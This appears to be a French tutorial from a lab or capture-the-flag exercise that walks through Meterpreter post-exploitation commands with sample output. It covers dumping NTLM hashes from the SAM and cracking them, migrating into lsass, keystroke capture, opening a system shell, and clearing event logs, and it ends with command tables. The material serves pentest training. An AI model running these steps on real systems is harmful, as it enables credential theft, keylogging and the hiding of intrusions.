
Une fois qu'on a pu acceder à la machine ciblé meterpreter nous offre beaucoup de commande.

## __Help__

Pour avoir la **liste des commandes** accessibles.

```shell
meterpreter > help

Core Commands 
============= 

	Command           Description
	-------           -----------
	?                 Help menu 
	background        Backgrounds the current session 
	bg                Alias for background
	bgkill            Kills a background meterpreter script 
	bglist            Lists running background scripts
	bgrun             Executes a meterpreter script as a background thread
	channel           Displays information or control active channels
	close             Closes a channel[...]
```


## __Getuid__

Pour récupérer le **nom de l'utilisateur actuel**.

```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```


## __Ps__

Pour **lister tous les processus en cours**.

```shell
meterpreter > ps 

Process List 
============ 

PID   PPID  Name              Arch Session User                           Path
---   ----  ----              ---- ------- ----                           ---- 
0     0     [System Process]
4     0     System            x64   0 
396   644   LogonUI.exe       x64   1      NT AUTHORITY\SYSTEM            C:\Windows\system32\LogonUI.exe 
416   4     smss.exe          x64   0      NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe 
428   692   svchost.exe       x64   0      NT AUTHORITY\SYSTEM 
548   540   csrss.exe         x64   0      NT AUTHORITY\SYSTEM            C:\Windows\system32\csrss.exe 
596   540   wininit.exe       x64   0      NT AUTHORITY\SYSTEM            C:\Windows\system32\wininit.exe
604   588   csrss.exe         x64   1      NT AUTHORITY\SYSTEM            C:\Windows\system32\csrss.exe
644   588   winlogon.exe      x64   1      NT AUTHORITY\SYSTEM            C:\Windows\system32\winlogon.exe 
692   596   services.exe      x64   0      NT AUTHORITY\SYSTEM            C:\Windows\system32\services.exe
700   692   sppsvc.exe        x64   0      NT AUTHORITY\NETWORK SERVICE 
716   596   lsass.exe         x64   0      NT AUTHORITY\SYSTEM            C:\Windows\system32\lsass.exe
724   596   lsm.exe           x64   0      NT AUTHORITY\SYSTEM            C:\Windows\system32\lsm.exe 
764   692   svchost.exe       x64   0      NT AUTHORITY\SYSTEM  
828   692   svchost.exe       x64   0      NT AUTHORITY\SYSTEM 
864   828   WmiPrvSE.exe   
900   692   svchost.exe       x64   0      NT AUTHORITY\NETWORK SERVICE 
952   692   svchost.exe       x64   0      NT AUTHORITY\LOCAL SERVICE 
1076  692   svchost.exe       x64   0      NT AUTHORITY\LOCAL SERVICE 
1164  548   conhost.exe       x64   0      NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
1168  692   svchost.exe       x64   0      NT AUTHORITY\NETWORK SERVICE
1244  548   conhost.exe       x64   0      NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
1276  1304  cmd.exe           x64   0      NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe 
1304  692   spoolsv.exe       x64   0      NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
1340  692   svchost.exe       x64   0      NT AUTHORITY\LOCAL SERVICE 
1388  548   conhost.exe       x64   0      NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe[...]
```


## __Migrate__

On peut **migrer meterpreter vers un autre processus** pour **mieux interagir** avec. Par exemple si on voit un logiciel de traitement de texte comme word.exe ou notepad.exe, on peut capturer les entrées clavier avec `keyscan_start`, `keyscan_stop` et `keyscan_dump`.

```shell
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully. 
meterpreter >
```


## __Hashdump__

Pour **récupérer les mots de passes de la db SAM** (Security Account Manager), ils sont stocké au format NTLM (New Technology LAN Manager).  On peut les déchiffrer grâce à des db comme [CrackStation](https://crackstation.net/).

```shell
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: 
meterpreter >
```


## __Search__

Permet de **trouver un fichier** dans le disque.

```shell
meterpreter > search -f flag2.txt
Found 1 result...
	c:\Windows\System32\config\flag2.txt (34 bytes)
meterpreter >
```


## __Shell__

Pour avoir un **terminal classique** de commande.

```shell
meterpreter > shell 
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601] 
Copyright (c) 2009 Microsoft Corporation. All rights reserved. 

C:\Windows\system32>
```


## __Commande utile__

### Commande Principale

| Commande     | Description                                                        |
| ------------ | ------------------------------------------------------------------ |
| `background` | Arrière-plan de la session en cours                                |
| `exit`       | Terminer la session Meterpreter                                    |
| `guid`       | Get the session GUID (Globally Unique Identifier)                  |
| `help`       | Displays the help menu                                             |
| `info`       | Displays information about a Post module                           |
| `irb`        | Opens an interactive Ruby shell on the current session             |
| `load`       | Loads one or more Meterpreter extensions                           |
| `migrate`    | Allows you to migrate Meterpreter to another process               |
| `run`        | Executes a Meterpreter script or Post module                       |
| `sessions`   | Quickly switch to another sessionQuickly switch to another session |

### Commande file system

| Commande   | Description                                                   |
| ---------- | ------------------------------------------------------------- |
| `cd`       | Will change directory                                         |
| `ls`       | Will list files in the current directory (dir will also work) |
| `pwd`      | Prints the current working directory                          |
| `edit`     | will allow you to edit a file                                 |
| `cat`      | Will show the contents of a file to the screen                |
| `rm`       | Will delete the specified file                                |
| `search`   | Will search for files                                         |
| `upload`   | Will upload a file or directory                               |
| `download` | Will download a file or directory                                                              |

### Commande network

| Commande   | Description                                                |
| ---------- | ---------------------------------------------------------- |
| `arp`      | Displays the host ARP (Address Resolution Protocol) cache  |
| `ifconfig` | Displays network interfaces available on the target system |
| `netstat`  | Displays the network connections                           |
| `portfwd`  | Forwards a local port to a remote service                  |
| `route`    | Allows you to view and modify the routing table                                                           |

### Commande systeme

| Commande   | Description                                   |
| ---------- | --------------------------------------------- |
| `clearev`  | Clears the event logs                         |
| `execute`  | Executes a command                            |
| `getpid`   | Shows the current process identifier          |
| `getuid`   | Shows the user that Meterpreter is running as |
| `kill`     | Terminates a process                          |
| `pkill`    | Terminates processes by name                  |
| `ps`       | Lists running processes                       |
| `reboot`   | Reboots the remote computer                   |
| `shell`    | Drops into a system command shell             |
| `shutdown` | Shuts down the remote computer                |
| `sysinfo`  | Gets information about the remote system, such as OS                                              |

### Autres

| Commande       | Description                                                 |
| -------------- | ----------------------------------------------------------- |
| `idletime`     | Returns the number of seconds the remote user has been idle |
| `keyscan_dump` | Dumps the keystroke buffer                                  |
|                |                                                             |
